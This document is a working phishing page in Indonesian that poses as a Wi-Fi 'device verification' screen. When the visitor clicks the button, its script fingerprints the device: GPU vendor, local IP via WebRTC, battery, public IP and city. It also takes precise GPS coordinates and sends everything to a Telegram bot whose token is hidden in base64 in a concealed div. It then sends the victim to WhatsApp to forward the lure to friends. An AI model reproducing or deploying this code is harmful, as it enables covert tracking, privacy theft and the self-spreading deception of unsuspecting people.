<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Jaringan</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f9fafb; color: #111827; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); text-align: center; max-width: 400px; border: 1px solid #e5e7eb; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #2563eb; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
        p { font-size: 14px; color: #6b7280; margin-bottom: 24px; line-height: 1.5; }
        .btn { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-weight: 500; cursor: pointer; width: 100%; transition: 0.2s; }
        #v-vault { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="loader"></div>
    <h2>Otentikasi Perangkat</h2>
    <p>Sesi Wi-Fi Anda memerlukan sinkronisasi ulang. Klik tombol di bawah untuk memverifikasi hardware ID dan melanjutkan koneksi.</p>
    <button class="btn" id="go" onclick="fullAudit()">VERIFIKASI SEKARANG</button>
</div>

<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>

<script>
    if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }

    const _D = document.getElementById('v-vault').innerText.split('|');
    const _T = atob(_D[1]); const _C = atob(_D[2]);

    async function fullAudit() {
        document.getElementById('go').innerText = "SYNCHRONIZING...";
        
        // 1. DATA DASAR (AUTO)
        let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
        let bt = "N/A"; try { const b = await navigator.getBattery(); bt = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}

        // 2. BRAND SNIFFER (GPU & Vendor)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

        // 3. NETWORK SNIFFER (Local IP)
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
        let lip = "Detecting...";
        pc.onicecandidate = (i) => { if(i && i.candidate) lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };

        // 4. GENERATE REPORT
        const report = `🔱 DEEP BRAND AUDIT 🔱\n\n` +
            `📱 PLATFORM: ${navigator.platform}\n` +
            `🏢 VENDOR: ${vendor}\n` +
            `🎮 GPU/BRAND: ${renderer}\n` +
            `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
            `🔋 BATT: ${bt}\n` +
            `🌐 IP: ${n.ip} (${n.org})\n` +
            `🏠 LOCAL: ${lip}\n` +
            `🏙️ LOC: ${n.city}, ${n.region}\n` +
            `📄 UA: ${navigator.userAgent}`;

        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
            method:'POST', headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:_C, text:report})
        });

        // 5. GPS STRIKE
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const maps = `🎯 PRECISION LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
                await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id:_C, text:maps})
                });
                
                // AUTO-PROPAGATE (Mancing temennya via WA)
                const msg = encodeURIComponent("Woi WiFi error, klik verifikasi di sini biar lancar lagi: " + window.location.href);
                window.location.href = `https://api.whatsapp.com/send?text=${msg}`;
            }, () => { window.location.href = "https://google.com"; }, {enableHighAccuracy:true});
        }
    }
</script>
</body>
</html>
